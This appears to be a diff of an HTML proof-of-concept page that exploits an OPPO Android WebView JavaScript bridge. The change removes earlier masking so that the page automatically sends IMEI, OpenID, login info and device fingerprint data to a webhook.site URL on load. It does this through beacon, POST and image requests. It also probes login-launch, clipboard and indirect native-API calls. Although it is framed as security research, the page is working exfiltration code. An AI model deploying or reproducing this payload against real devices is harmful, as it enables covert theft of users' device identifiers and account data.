@@ -2,26 +2,34 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>OPPO WebBridge Sensitive Minimal Probe</title>
+  <title>OPPO WebBridge RAW Sensitive Probe v3</title>
   <style>
-    body { font-family: sans-serif; padding: 24px; }
-    pre { background: #f3f3f3; padding: 16px; white-space: pre-wrap; word-break: break-word; }
-    .warn { color: #b00020; font-weight: bold; }
-    button { padding: 10px 16px; margin: 8px 0; }
+    body { font-family: sans-serif; padding: 24px; background:#000; color:#eee; }
+    pre { background: #f3f3f3; color:#111; padding: 16px; white-space: pre-wrap; word-break: break-word; }
+    .warn { color: #ff3355; font-weight: bold; }
+    button { padding: 10px 16px; margin: 8px 8px 8px 0; }
   </style>
 </head>
 <body>
-<h1>OPPO WebBridge Sensitive Minimal Probe</h1>
-<p class="warn">Full sensitive values are displayed locally only. Webhook receives short metadata only.</p>
+<h1>OPPO WebBridge RAW Sensitive Probe v3</h1>
+<p class="warn">
+  RAW mode: full returned values are displayed locally and also sent to the configured researcher webhook.
+</p>
+
+<button onclick="runFullRawProbe('manual_raw_button')">Run RAW sensitive probe</button>
+<button onclick="tryStartLogin('manual_start_login_button')">Try doStartLogin</button>
+<button onclick="tryClipboardMarker('manual_clipboard_button')">Try clipboard marker</button>
+<button onclick="tryIndirectNativeApi('manual_indirect_native_api_button')">Try indirect callNativeApi/callAsyncNativeApi</button>
+
 <p id="status">WAITING</p>
-<button onclick="runProbe('manual_button')">Run minimal sensitive probe again</button>
 <pre id="out"></pre>
 
 <script>
 (function () {
   const WEBHOOK = "https://webhook.site/0d6bb58d-a021-4aa2-b4d6-2d2ebb72fcdd";
+  const RAW_TO_WEBHOOK = true;
 
-  const METHODS = [
+  const RAW_METHODS = [
     "getImei",
     "getOpenId",
     "getLoginInfo",
@@ -29,7 +37,14 @@
     "getChannelId",
     "getPackageName",
     "getDeviceModel",
-    "getNetworkType"
+    "getNetworkType",
+    "getRomVersion",
+    "getRomVersionCode",
+    "getStatusBarHeight",
+    "isInstalled",
+    "isSupportShake",
+    "getProgress",
+    "getButtonStatus"
   ];
 
   function safeString(x) {
@@ -44,39 +59,60 @@
     }
   }
 
-  function maskLocalPreview(s) {
-    if (!s || s === "undefined" || s === "null") return s;
-    if (s.length <= 8) return s;
-    return s.slice(0, 4) + "***" + s.slice(-4);
+  function describeAndroidObject() {
+    const a = window.android;
+    if (!a || typeof a !== "object") return { exists: false, type: typeof a };
+
+    let ownKeys = [];
+    let functionKeys = [];
+    try {
+      ownKeys = Object.getOwnPropertyNames(a).slice(0, 160);
+      functionKeys = ownKeys.filter(k => {
+        try { return typeof a[k] === "function"; } catch (e) { return false; }
+      });
+    } catch (e) {}
+
+    return {
+      exists: true,
+      type: typeof a,
+      tag: Object.prototype.toString.call(a),
+      ownKeys,
+      functionKeys
+    };
   }
 
-  function callMethod(name) {
+  function callBridge(method, args) {
+    const a = window.android;
     const item = {
-      method: name,
+      method,
+      args: args || [],
       exists: false,
       ok: false,
       returnType: null,
-      rawReturnValue_LOCAL_ONLY: null,
+      rawReturnValue: null,
+      empty: null,
       error: null
     };
 
     try {
-      const a = window.android;
       if (!a || typeof a !== "object") {
         item.error = "window.android missing";
         return item;
       }
 
-      item.exists = typeof a[name] === "function";
+      item.exists = typeof a[method] === "function";
       if (!item.exists) {
         item.error = "missing_or_not_function";
         return item;
       }
 
-      const ret = a[name]();
+      const ret = a[method].apply(a, args || []);
+      const raw = safeString(ret);
+
       item.ok = true;
       item.returnType = typeof ret;
-      item.rawReturnValue_LOCAL_ONLY = safeString(ret);
+      item.rawReturnValue = raw;
+      item.empty = raw.length === 0 || raw === "undefined" || raw === "null";
       return item;
     } catch (e) {
       item.error = String(e && (e.stack || e.message || e));
@@ -84,60 +120,16 @@
     }
   }
 
-  function sendShortGet(result) {
-    const summary = result.results.map(function (r) {
-      const raw = safeString(r.rawReturnValue_LOCAL_ONLY);
-      return [
-        r.method,
-        r.exists ? "exists" : "missing",
-        r.ok ? "ok" : "fail",
-        r.returnType || "none",
-        raw.length,
-        raw && raw !== "undefined" && raw !== "null" ? "nonempty" : "empty",
-        maskLocalPreview(raw)
-      ].join(":");
-    }).join("|");
-
-    const url =
-      WEBHOOK +
-      "/oppo-sensitive-minimal-get" +
-      "?event=OPPO_SENSITIVE_MINIMAL_RESULT" +
-      "&t=" + encodeURIComponent(Date.now()) +
-      "&ua=" + encodeURIComponent(navigator.userAgent.slice(0, 180)) +
-      "&href=" + encodeURIComponent(location.href.slice(0, 240)) +
-      "&summary=" + encodeURIComponent(summary.slice(0, 3000));
-
-    try {
-      const img = new Image();
-      img.src = url;
-    } catch (e) {}
-
-    // 第二发极短心跳，防止 summary 仍然过长
-    try {
-      const img2 = new Image();
-      img2.src =
-        WEBHOOK +
-        "/oppo-sensitive-heartbeat" +
-        "?event=OPPO_SENSITIVE_HEARTBEAT" +
-        "&t=" + encodeURIComponent(Date.now()) +
-        "&bridge=" + encodeURIComponent(!!window.android) +
-        "&ua=" + encodeURIComponent(navigator.userAgent.slice(0, 120));
-    } catch (e) {}
-  }
-
-  window.runProbe = function(reason) {
-    const results = METHODS.map(callMethod);
-
-    const result = {
-      eventType: "OPPO_SENSITIVE_MINIMAL_LOCAL_RESULT",
-      version: "minimal_get_only_v1",
+  function basePayload(eventType, reason) {
+    return {
+      eventType,
+      version: "raw_sensitive_v3",
       ts: new Date().toISOString(),
       reason,
       safetyBoundary: {
         rawSensitiveValuesDisplayedOnDevice: true,
-        rawSensitiveValuesSentToWebhook: false,
-        webhookTransport: "Image GET only; short metadata summary only",
-        stateChangingMethodsCalled: false
+        rawSensitiveValuesSentToWebhook: RAW_TO_WEBHOOK,
+        testingDevice: "researcher_owned_device"
       },
       location: {
         href: location.href,
@@ -149,29 +141,106 @@
         userAgent: navigator.userAgent,
         platform: navigator.platform,
         language: navigator.language,
+        cookieEnabled: navigator.cookieEnabled,
         webdriver: navigator.webdriver
       },
-      androidBridge: {
-        exists: !!window.android,
-        type: typeof window.android,
-        tag: window.android ? Object.prototype.toString.call(window.android) : null
-      },
-      results: results
+      androidBridge: describeAndroidObject()
     };
+  }
 
+  function sendWebhook(payload) {
+    const json = JSON.stringify(payload);
+
+    try {
+      navigator.sendBeacon(
+        WEBHOOK + "/oppo-sensitive-raw-beacon",
+        new Blob([json], { type: "text/plain" })
+      );
+    } catch (e) {}
+
+    try {
+      fetch(WEBHOOK + "/oppo-sensitive-raw-post", {
+        method: "POST",
+        mode: "no-cors",
+        headers: { "content-type": "text/plain" },
+        body: json
+      }).catch(function(){});
+    } catch (e) {}
+
+    try {
+      const encoded = encodeURIComponent(json).slice(0, 7500);
+      new Image().src =
+        WEBHOOK +
+        "/oppo-sensitive-raw-get?event=" +
+        encodeURIComponent(payload.eventType) +
+        "&t=" + Date.now() +
+        "&d=" + encoded;
+    } catch (e) {}
+  }
+
+  function renderAndSend(payload) {
     document.getElementById("status").textContent =
-      "OPPO_SENSITIVE_MINIMAL_DONE: " + result.ts;
+      payload.eventType + ": " + payload.ts;
 
     document.getElementById("out").textContent =
-      JSON.stringify(result, null, 2);
+      JSON.stringify(payload, null, 2);
 
-    sendShortGet(result);
+    sendWebhook(payload);
+  }
+
+  window.runFullRawProbe = function(reason) {
+    const payload = basePayload("OPPO_SENSITIVE_RAW_RESULT", reason);
+    payload.results = RAW_METHODS.map(m => callBridge(m, []));
+    renderAndSend(payload);
+  };
+
+  window.tryStartLogin = function(reason) {
+    const payload = basePayload("OPPO_START_LOGIN_RESULT", reason);
+    payload.result = callBridge("doStartLogin", []);
+    payload.note = "If a login/account UI is opened by attacker-controlled web content, this is a high-value native-action sink even if no raw ID is returned.";
+    renderAndSend(payload);
+  };
+
+  window.tryClipboardMarker = function(reason) {
+    const marker = "OPPO_AUDIT_CLIPBOARD_MARKER_" + Date.now();
+    const payload = basePayload("OPPO_CLIPBOARD_MARKER_RESULT", reason);
+    payload.marker = marker;
+    payload.results = [
+      callBridge("clipboardText", []),
+      callBridge("clipboardText", [marker]),
+      callBridge("clipboardText", [JSON.stringify({ text: marker })])
+    ];
+    renderAndSend(payload);
+  };
+
+  window.tryIndirectNativeApi = function(reason) {
+    const payload = basePayload("OPPO_INDIRECT_NATIVE_API_RESULT", reason);
+    const candidates = [
+      ["callNativeApi", ["getImei"]],
+      ["callNativeApi", ["getOpenId"]],
+      ["callNativeApi", ["getLoginInfo"]],
+      ["callNativeApi", [JSON.stringify({ method: "getImei" })]],
+      ["callNativeApi", [JSON.stringify({ method: "getOpenId" })]],
+      ["callNativeApi", [JSON.stringify({ method: "getLoginInfo" })]],
+      ["callNativeApi", [JSON.stringify({ api: "getImei" })]],
+      ["callNativeApi", [JSON.stringify({ api: "getOpenId" })]],
+      ["callNativeApi", [JSON.stringify({ api: "getLoginInfo" })]],
+      ["callAsyncNativeApi", ["getImei"]],
+      ["callAsyncNativeApi", ["getOpenId"]],
+      ["callAsyncNativeApi", ["getLoginInfo"]],
+      ["callAsyncNativeApi", [JSON.stringify({ method: "getImei" })]],
+      ["callAsyncNativeApi", [JSON.stringify({ method: "getOpenId" })]],
+      ["callAsyncNativeApi", [JSON.stringify({ method: "getLoginInfo" })]]
+    ];
+    payload.results = candidates.map(c => callBridge(c[0], c[1]));
+    renderAndSend(payload);
   };
 
   setTimeout(function () {
-    runProbe("auto_after_load_1200ms");
+    runFullRawProbe("auto_after_load_1200ms");
   }, 1200);
 })();
 </script>
 </body>
 </html>
+HTML
